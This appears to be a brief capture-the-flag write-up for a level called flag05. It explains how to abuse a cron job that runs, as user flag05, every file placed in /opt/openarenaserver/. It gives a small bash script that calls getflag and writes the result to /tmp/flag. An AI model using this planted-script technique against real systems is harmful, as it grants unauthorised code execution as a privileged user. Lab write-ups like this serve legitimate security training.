It is a script that execute every file in `/opt/openarenaserver/` and delete them
It is ran every minute
We just need to add a script in there to be executed by the flag05 user

```
#!/bin/bash

getflag > /tmp/flag
```
`chmod +x <your file>`
place it in `/opt/openarenaserver/` and wait the script to be executed
